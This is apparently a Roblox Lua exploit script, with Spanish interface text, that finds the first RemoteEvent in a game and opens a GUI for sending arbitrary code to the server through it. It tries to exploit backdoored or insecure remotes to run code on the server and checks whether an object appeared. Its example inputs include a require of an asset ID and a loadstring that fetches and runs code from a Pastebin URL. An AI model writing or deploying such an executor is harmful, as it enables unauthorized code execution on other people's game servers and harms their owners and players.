local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

-- Encuentra el primer RemoteEvent
local remote = nil
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("RemoteEvent") then
		remote = obj
		break
	end
end

if not remote then
	warn("❌ No se encontró ningún RemoteEvent.")
	return
end

-- GUI principal
local gui = Instance.new("ScreenGui")
gui.Name = "RemoteExecutorGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 300)
frame.Position = UDim2.new(0.3, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "🎯 Remote encontrado: " .. remote:GetFullName()
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.SourceSansBold
title.TextSize = 20
title.TextWrapped = true
title.Parent = frame

local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1, -20, 0, 140)
inputBox.Position = UDim2.new(0, 10, 0, 50)
inputBox.Text = [[
-- Ejemplos que puedes probar:
-- require(12345678)
-- loadstring(game:HttpGet("https://pastebin.com/raw/..."))()
-- Instance.new("Part", workspace)
]]
inputBox.ClearTextOnFocus = true
inputBox.MultiLine = true
inputBox.TextWrapped = true
inputBox.TextXAlignment = Enum.TextXAlignment.Left
inputBox.TextYAlignment = Enum.TextYAlignment.Top
inputBox.TextColor3 = Color3.fromRGB(0, 255, 0)
inputBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
inputBox.Font = Enum.Font.Code
inputBox.TextSize = 14
inputBox.Parent = frame

local output = Instance.new("TextLabel")
output.Size = UDim2.new(1, -20, 0, 40)
output.Position = UDim2.new(0, 10, 0, 200)
output.Text = "🟡 Esperando envío..."
output.TextColor3 = Color3.fromRGB(255, 255, 255)
output.BackgroundTransparency = 1
output.Font = Enum.Font.SourceSans
output.TextSize = 18
output.TextWrapped = true
output.TextXAlignment = Enum.TextXAlignment.Left
output.Parent = frame

local executeButton = Instance.new("TextButton")
executeButton.Size = UDim2.new(0, 240, 0, 40)
executeButton.Position = UDim2.new(0, 10, 1, -50)
executeButton.Text = "🚀 Enviar código al servidor"
executeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
executeButton.Font = Enum.Font.SourceSansBold
executeButton.TextSize = 18
executeButton.Parent = frame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 220, 0, 40)
closeButton.Position = UDim2.new(1, -230, 1, -50)
closeButton.Text = "❌ Cerrar"
closeButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 18
closeButton.Parent = frame

-- Función que envía el texto al servidor usando el Remote
local function sendPayload()
	local code = inputBox.Text
	if code == "" then
		output.Text = "⚠️ Escribe algo primero."
		return
	end

	output.Text = "📨 Enviando a: " .. remote.Name
	local success = pcall(function()
		remote:FireServer(code)
	end)

	task.wait(0.5)

	-- Intenta detectar si algo se ejecutó (por ejemplo un objeto creado)
	local found = false
	for _, v in ipairs(Workspace:GetChildren()) do
		if v.Name == "Test" or v.Name:match("^RemoteTest_") then
			found = true
			break
		end
	end

	if found then
		output.Text = "✅ ¡Se ejecutó el código en el servidor!"
	else
		output.Text = "❌ El servidor no hizo nada visible."
	end
end

executeButton.MouseButton1Click:Connect(sendPayload)
closeButton.MouseButton1Click:Connect(function()
	gui:Destroy()
end)
